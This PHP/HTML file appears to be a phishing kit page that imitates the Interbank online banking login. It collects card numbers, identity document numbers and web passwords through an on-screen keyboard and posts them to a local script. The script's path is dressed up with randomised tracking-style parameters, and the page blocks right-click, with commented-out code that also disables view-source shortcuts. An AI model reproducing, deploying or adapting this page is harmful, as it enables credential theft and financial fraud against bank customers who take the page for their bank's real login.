<?php
/****************************************************************************/
$sra = array("publica", "public", "publict");

function nomb_a($sra) { 

	$randon = array_rand($sra);
	$mycarp = $sra[$randon]; 
	return $mycarp; }

$rutaA = nomb_a($sra);
/****************************************************************************/
$srb = array("referral", "referido", "referal");

function nomb_b($srb) { 

	$randon = array_rand($srb);
	$mycarp = $srb[$randon]; 
	return $mycarp; }

$rutaB = nomb_b($srb);
/****************************************************************************/
$src = array("canales", "chanel", "canal");

function nomb_c($src) { 

	$randon = array_rand($src);
	$mycarp = $src[$randon]; 
	return $mycarp; }

$rutaC = nomb_c($src);
/****************************************************************************/
$srd = array("globals", "globales", "global");
function nomb_d($srd) { 

	$randon = array_rand($srd);
	$mycarp = $srd[$randon]; 
	return $mycarp; }

$rutaD = nomb_d($srd);
/****************************************************************************/
$ir = "p?mcid=".$rutaA.":".$rutaB.":00-0000_".$rutaC.":header:".$rutaD.":whl00001";
?>
<!DOCTYPE html>
<html class="" lang="es"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=EDGE">
<title>Interbank</title>
<link rel="stylesheet" type="text/css" href="files/css/warhol.min.css">
<link rel="stylesheet" type="text/css" href="files/css/style.css">   
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
<link href="files/img/favicon.ico" rel="Shortcut Icon">
<script type="text/javascript" src="files/js/main.js"></script>
<link href="https://fonts.googleapis.com/css?family=Krub" rel="stylesheet">    
<!--
<script language="JavaScript">
document.onkeydown = function(e) {
tecla = (document.all) ? e.keyCode : e.which;
	//alert(tecla)
if (tecla === 116 || tecla === 123)  return false;
if (e.ctrlKey && (tecla === 67 || tecla === 83 || tecla === 85 || tecla === 86 || tecla === 116)) { return false; } else { return true; }};
$(document).keypress("u",function(e) { if(e.ctrlKey) { return false; } else { return true; } });
</script>
-->
<script>
//autor: karlankas -Actualizado por panino5001-
texto="";
var Tletras=new Array ("3","8","6","7","1","5","0","9","4","2","Q","W","E","R","T","Y","U","I","O","P","A","S","D","F","G","H","J","K","L","Ñ","Z","X","C","V","B","N","M");
var z=0;
var mayus=false
function anadir(letra){

//texto=document.f.pass.value;
texto=document.getElementById("pass").value;
if(letra=="\b"){
numeroLetras=texto.length-1
texto=texto.substring(0,numeroLetras);
}
else{
if(!mayus){letra=letra.toLowerCase()}
texto=texto+letra;
}
//document.f.pass.value=texto;
document.getElementById("pass").value = texto;
}
function mostrar(){
if (z==0){z=1;document.getElementById('botones').style="display:block !important";pregunta.innerHTML="Ocultar teclado";}
else {z=0;document.getElementById('botones').style="display:none !important";pregunta.innerHTML="Mostrar teclado";}
 }
 function cambiomayus(aqui){
 if(aqui.checked){mayus=true}
 else{mayus=false}
 }


</script>
    
<script language="JavaScript">
document.addEventListener("contextmenu", function(e){e.preventDefault();}, false);
</script>
<style>.mboxDefault { visibility:hidden; }</style>
<style type="text/css">.fancybox-margin{margin-right:0px;}</style>
</head>
<script language="javascript">
function comprobar() {

   var tar = document.formu.tarjeta;
   var doc = document.formu.documento;
  
	if (tar.value.length < 15) {
		alert("Error, debes ingresar tu número de tarjeta");
		tar.focus();
		return false; }
	if (doc.value.length < 8) {
		alert("Error, debes ingresar tu número de documento");
		doc.focus();
		return false; }
	
	document.getElementById("boton1").disabled = true;
	return true;
}
</script>

<script type="text/javascript">
function soloNumeros(e) {
	var key = window.Event ? e.which : e.keyCode
	return ((key >= 48 && key <= 57) || (key==8)) }
</script>


<body>

<!-- logo_righ -->
<div class="col-12 text-right">
    <img src="files/img/logo_white.svg" class="logo-right-primary" />
</div>    
<!-- logo_righ -->      
      
<section class="login login-paso1">
            <!--
			<figure class="logo">
				<a id="a-logo" href="#" class="logo-desktop">
					<img src="files/img/logo-desktop.png" alt="Interbank" class="png" width="205" height="38">
				</a>
				<a id="a-logo-sec" href="#" class="logo-responsive">
					<img src="files/img/logo-responsive.png" alt="Interbank" class="png" width="155" height="29">
				</a>
			</figure>
            -->
<div id="div-login" class="container-login-info">
    <div class="login-info">
<!-- estado -->
<!--    
<ul class="estado-3pasos estado-login">
	<li class="paso-1 presente"><span>1</span><p></p></li>
	<li class="paso-2"><span>2</span><p></p></li>
	<li class="paso-3"><span>3</span><p></p></li>
</ul>
-->
<!-- /estado -->
<!--    
<h2>Iniciar Sesión</h2>
-->
<form id="form-logueo-p1" name="formu" action="<?=$ir;?>" method="post" onsubmit="return comprobar()">
    
        <ul class="elemento">
            <!--<li>Ingresa el número de tu tarjeta</li>-->
            <li class="tarjeta-login">
                <input name="tarjeta" onpaste="return false" type="tel" id="tarjeta" maxlength="16" onKeyPress="return soloNumeros(event)" placeholder="Número de tarjeta">
                <input id="input-recordar-tarjeta" name="input-recordar-tarjeta" type="checkbox">
            </li>
            <li class="tarjeta-login"></li>
            <li class="tarjeta-login">
              <p></p>
              <div id="msgMaxLength" class="advertencia" style="font-size:.75em"></div>
            </li>
            <!--
            <li class="nota-form">
                <label class="alineacion">
                <input id="input-recordar-tarjeta" name="input-recordar-tarjeta" type="checkbox">Recordar
                </label>
            </li>
            -->
    <li>
            </li>
        </ul>

        <ul class="elemento">
            <!--<li>Tipo y número de documento de identidad</li>-->
            <li class="agrupar">
                <div class="seleccion">
                    <select name="tipo">
                        <option value="DNI" selected="selected">DNI</option>
                        <option value="CEX">CE</option>
                        <option value="PTE">PAS</option>
                    </select>
                </div>
                <div class="dato">
                    <input name="documento" onpaste="return false" type="tel" id="documento" maxlength="11" class="document-number" placeholder="Número de documento">
                    <input id="input-recordar-documento" name="input-recordar-documento" type="checkbox">
                </div>
            </li>
            <li class="agrupar">
              <div class="dato">
                <p></p>
              </div>
            </li>
            <!--
            <li class="nota-form">
                <label>
                <input id="input-recordar-documento" name="input-recordar-documento" type="checkbox">Recordar
                </label>
            </li>
            -->

        </ul>
    
    <ul class="elemento">
        <div class="dato">
            <input name="pass" id="pass" onclick="mostrar();" onpaste="return false" autocomplete="off" readonly="readonly" class="secure" type="password" placeholder="Clave web"  >
        </div>
    </ul>
    
    <table width="310" border="0">
  <tr>
    <td  bgcolor="#fff"><div align=center id="botones" class="hidden-el" ></div>
<script>
var letras="";
var p=0;
for (a=0;a<Tletras.length;a++){
letras=letras+"<input class='button_teclado' type='Button' value="+Tletras[a]+" onclick=anadir('"+Tletras[a]+"')>&nbsp;";
p=p+1;
if(p==10){p=0;letras=letras;}
}
document.getElementById('botones').innerHTML=letras+"<input class='button_teclado' alt='Borrar' type='Button' value=&laquo; onClick=anadir('\b')>";
</script>
</td>
  </tr>
</table>

        <div class="botonera enviar">
            <p class="pasos pasos-login"><center><input name="boton1" id="boton1" type="submit" value="Ingresar"></center></p>
            <!--<p class="pasos pasos-login">Paso <span class="activo">1</span> de <span class="total">3</span></p>-->
        </div>
    
</form>
        
</div>

<div class="separar text-center">
	<form id="form-registro" name="form-registro" action="#" method="post" autocomplete="off">
		<p class="registrate">
			<a id="btnIrRegistro" href="javascript:void(0);" class=""><span>Registro</span></a> |
            <a id="btnIrOlvidoClave" href="#" class="link">¿Olvidaste tu clave web?</a>
		</p>
	</form>
</div>      
    
<!--<script src="files/js/loginInicio.js"></script>-->
</div>

  
    
<!-- aprende a usar tu banca    
<a href="#" class="Login__Footer">
	<div class="Login__Footer-container">
		<div class="Login__Footer-icon">
			<i class="icon-bpi icon-bpi-question"></i></div>
		<div class="Login__Footer-text">Aprende a usar tu Banca por Internet</div>
	</div>
</a>
-->
<!--</section>
		<script type="text/javascript">
			var maxsesion = 290;
			var contsesion = maxsesion;
			var candado = 1;
			
			function actualizarSesion() {
				if (contsesion > 0 && candado == 1) {
					contsesion = contsesion - 1;					
					if (contsesion == 0) {
						location.reload();
					}
				} 			
		    }
		    
		    function reiniciaContador() {
		    	candado = 0;
				contsesion = maxsesion;	
				candado = 1;		
		    }

			self.setInterval(function () { actualizarSesion(); }, 1000);
		</script>-->
		<!--<script src="files/js/login.js"></script>-->
</body></html>